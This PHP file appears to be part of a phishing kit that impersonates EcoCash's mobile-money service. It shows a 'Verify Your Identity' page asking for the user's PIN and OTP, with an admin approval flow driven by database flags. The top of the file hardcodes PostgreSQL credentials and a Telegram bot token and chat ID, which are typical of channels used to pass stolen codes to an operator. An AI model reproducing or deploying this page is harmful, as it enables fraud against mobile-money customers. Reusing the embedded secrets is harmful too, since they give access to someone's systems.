<?php
session_start();

// ========== POSTGRESQL CONFIGURATION ==========
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==============================================

$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";



function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
if (!$conn) {
    die("Database connection failed.");
}

// Ensure phone exists in users table (insert with default flags)
$check = pg_query_params($conn, "SELECT phone FROM users WHERE phone = $1", [$phone]);
if (!$check || pg_num_rows($check) == 0) {
    pg_query_params($conn, "INSERT INTO users (phone, status, pin, otp, approve) VALUES ($1, 0, 0, 0, 0)", [$phone]);
}

// Handle AJAX verification and deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    
    header('Content-Type: application/json');
    $type = $_POST['type'] ?? '';
    $action = $_POST['action'] ?? '';
    
    // Handle delete action
    if ($type === 'delete' && $action === 'confirm') {
        $deleteSql = "DELETE FROM users WHERE phone = $1";
        $result = pg_query_params($conn, $deleteSql, [$phone]);
        if ($result) {
            session_destroy();
           
        } else {
            echo json_encode(['success' => false, 'error' => 'Could not delete user']);
        }
        exit;
    }
    
    // Existing verification logic (PIN/OTP)
    if (!in_array($type, ['pin', 'otp']) || $action !== 'correct') {
        echo json_encode(['success' => false, 'error' => 'Invalid request']);
        exit;
    }
    
    $col = $type; // 'pin' or 'otp'
    $sql = "SELECT $col FROM users WHERE phone = $1";
    $result = pg_query_params($conn, $sql, [$phone]);
    if (!$result || !($row = pg_fetch_assoc($result))) {
        echo json_encode(['success' => false, 'error' => 'User not found']);
        exit;
    }
    
    $flag = (int)$row[$col];
    if ($flag === 1) {
        echo json_encode(['success' => true, 'message' => ucfirst($type) . ' verified', 'redirect' => ($type === 'pin' ? 'otp.php' : 'dashboard.php')]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Wrong ' . strtoupper($type)]);
    }
    exit;
}

// Get current flags for display
$sql = "SELECT pin, otp FROM users WHERE phone = $1";
$res = pg_query_params($conn, $sql, [$phone]);
$pinFlag = 0;
$otpFlag = 0;
if ($res && $row = pg_fetch_assoc($res)) {
    $pinFlag = (int)$row['pin'];
    $otpFlag = (int)$row['otp'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify PIN & OTP | EcoCash</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; background: #f1f5f9; font-family: Arial, Helvetica, sans-serif; padding: 20px; }
        .header { text-align: center; padding: 15px; font-size: 24px; font-weight: bold; }
        .header span:first-child { color: red; }
        .header span:last-child { color: #2563eb; }
        .card { max-width: 500px; margin: 20px auto; background: #fff; padding: 30px; border-radius: 18px; box-shadow: 0 8px 25px rgba(0,0,0,.08); text-align: center; }
        .title { font-size: 20px; font-weight: bold; margin-bottom: 20px; }
        .phone-box { background: #f8fafc; padding: 12px; border-radius: 10px; margin-bottom: 20px; font-size: 16px; }
        .btn-group { display: flex; gap: 15px; justify-content: center; margin: 25px 0; flex-wrap: wrap; }
        button { padding: 12px 24px; border: none; border-radius: 40px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .btn-pin { background-color: #1d4ed8; color: white; }
        .btn-pin:hover { background-color: #1e40af; }
        .btn-otp { background-color: #10b981; color: white; }
        .btn-otp:hover { background-color: #059669; }
        .btn-delete { background-color: #dc2626; color: white; }
        .btn-delete:hover { background-color: #b91c1c; }
        .status { margin-top: 20px; padding: 12px; border-radius: 12px; background: #f8fafc; font-size: 14px; }
        .status span { font-weight: bold; }
        .status .approved { color: green; }
        .status .pending { color: orange; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: white; border-radius: 16px; width: 320px; padding: 24px; text-align: center; }
        .modal-content p { margin: 0 0 15px; font-size: 18px; font-weight: 600; }
        .modal-content input { width: 90%; padding: 10px; margin: 10px 0 20px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; text-align: center; }
        .modal-buttons { display: flex; gap: 12px; justify-content: center; }
        .modal-buttons button { padding: 8px 20px; font-size: 14px; }
        .btn-correct { background-color: #10b981; color: white; }
        .footer { text-align: center; font-size: 11px; color: #6c757d; margin-top: 20px; }
        @media (max-width: 500px) {
            .btn-group { flex-direction: column; }
            button { width: 100%; }
        }
    </style>
</head>
<body>
<div class="header"><span>Eco</span><span>Cash</span></div>
<div class="card">
    <div class="title">Verify Your Identity</div>
    <div class="phone-box"><strong>Phone:</strong> +263 <?= htmlspecialchars($phone) ?></div>
    <div class="btn-group">
        <button class="btn-pin" id="pinBtn">🔐 Verify PIN</button>
        <button class="btn-otp" id="otpBtn">📱 Verify OTP</button>
        <button class="btn-delete" id="deleteBtn">🗑️ Delete Account</button>
    </div>
    <div class="status" id="statusBox">
        <div>PIN Status: <span id="pinStatus" class="<?= $pinFlag ? 'approved' : 'pending' ?>"><?= $pinFlag ? 'Approved (1)' : 'Pending (0)' ?></span></div>
        <div>OTP Status: <span id="otpStatus" class="<?= $otpFlag ? 'approved' : 'pending' ?>"><?= $otpFlag ? 'Approved (1)' : 'Pending (0)' ?></span></div>
    </div>
    <div class="footer">Both must be approved by admin to continue</div>
</div>

<!-- Modal for PIN/OTP verification -->
<div id="verifyModal" class="modal">
    <div class="modal-content">
        <p id="modalTitle">Enter any 4 digits</p>
        <input type="text" id="modalInput" placeholder="0000" maxlength="6" autocomplete="off">
        <div class="modal-buttons">
            <button id="modalCorrect" class="btn-correct">✔ Continue</button>
        </div>
    </div>
</div>

<!-- Modal for delete confirmation -->
<div id="deleteModal" class="modal">
    <div class="modal-content">
        <p>Are you sure you want to delete your account?</p>
        <div class="modal-buttons">
            <button id="confirmDelete" style="background:#dc2626; color:white;">Yes, Delete</button>
            <button id="cancelDelete" style="background:#6b7280; color:white;">Cancel</button>
        </div>
    </div>
</div>

<script>
    let currentType = null;
    const verifyModal = document.getElementById('verifyModal');
    const deleteModal = document.getElementById('deleteModal');
    const modalTitle = document.getElementById('modalTitle');
    const modalInput = document.getElementById('modalInput');
    const pinStatusSpan = document.getElementById('pinStatus');
    const otpStatusSpan = document.getElementById('otpStatus');

    function showVerifyModal(type) {
        currentType = type;
        modalTitle.innerText = type === 'pin' ? 'Enter any 4 digits' : 'Enter any 6 digits';
        modalInput.value = '';
        modalInput.maxLength = type === 'pin' ? 4 : 6;
        verifyModal.style.display = 'flex';
    }

    function closeVerifyModal() {
        verifyModal.style.display = 'none';
        currentType = null;
    }

    function showDeleteModal() {
        deleteModal.style.display = 'flex';
    }

    function closeDeleteModal() {
        deleteModal.style.display = 'none';
    }

    async function sendVerification(type) {
        const value = modalInput.value.trim();
        if (type === 'pin' && value.length !== 4) {
            alert('Please enter 4 digits');
            return;
        }
        if (type === 'otp' && value.length !== 6) {
            alert('Please enter 6 digits');
            return;
        }
        
        const formData = new FormData();
        formData.append('type', type);
        formData.append('action', 'correct');
        
        try {
            const response = await fetch(window.location.href, {
                method: 'POST',
                headers: { 'X-Requested-With': 'XMLHttpRequest' },
                body: formData
            });
            const result = await response.json();
            if (result.success) {
                if (result.redirect) {
                    window.location.href = result.redirect;
                } else {
                    await refreshStatuses();
                    showTemporaryMessage(result.message, 'green');
                }
            } else {
                showTemporaryMessage(result.error, 'red');
            }
        } catch (err) {
            alert('Network error: ' + err.message);
        }
        closeVerifyModal();
    }

    async function deleteAccount() {
        const formData = new FormData();
        formData.append('type', 'delete');
        formData.append('action', 'confirm');
        try {
            const response = await fetch(window.location.href, {
                method: 'POST',
                headers: { 'X-Requested-With': 'XMLHttpRequest' },
                body: formData
            });
            const result = await response.json();
            if (result.success && result.redirect) {
                window.location.href = result.redirect;
            } else {
                alert('Deletion failed: ' + (result.error || 'Unknown error'));
            }
        } catch (err) {
            alert('Network error: ' + err.message);
        }
        closeDeleteModal();
    }

    async function refreshStatuses() {
        const response = await fetch(window.location.href + '?get_flags=1');
        const data = await response.json();
        pinStatusSpan.innerText = data.pin === 1 ? 'Approved (1)' : 'Pending (0)';
        pinStatusSpan.className = data.pin === 1 ? 'approved' : 'pending';
        otpStatusSpan.innerText = data.otp === 1 ? 'Approved (1)' : 'Pending (0)';
        otpStatusSpan.className = data.otp === 1 ? 'approved' : 'pending';
    }

    function showTemporaryMessage(msg, color) {
        const statusBox = document.getElementById('statusBox');
        const div = document.createElement('div');
        div.style.cssText = `color:${color}; margin-top:10px; font-weight:bold;`;
        div.innerText = msg;
        statusBox.appendChild(div);
        setTimeout(() => div.remove(), 3000);
    }

    document.getElementById('pinBtn').onclick = () => showVerifyModal('pin');
    document.getElementById('otpBtn').onclick = () => showVerifyModal('otp');
    document.getElementById('deleteBtn').onclick = () => showDeleteModal();
    document.getElementById('modalCorrect').onclick = () => sendVerification(currentType);
    document.getElementById('confirmDelete').onclick = () => deleteAccount();
    document.getElementById('cancelDelete').onclick = () => closeDeleteModal();
    window.onclick = (e) => {
        if (e.target === verifyModal) closeVerifyModal();
        if (e.target === deleteModal) closeDeleteModal();
    };
</script>

<?php
// AJAX endpoint to get current flags (pin, otp)
if (isset($_GET['get_flags']) && $_GET['get_flags'] == 1) {
    header('Content-Type: application/json');
    $sql = "SELECT pin, otp FROM users WHERE phone = $1";
    $res = pg_query_params($conn, $sql, [$phone]);
    if ($res && $row = pg_fetch_assoc($res)) {
        echo json_encode(['pin' => (int)$row['pin'], 'otp' => (int)$row['otp']]);
    } else {
        echo json_encode(['pin' => 0, 'otp' => 0]);
    }
    exit;
}
?>
</body>
</html>
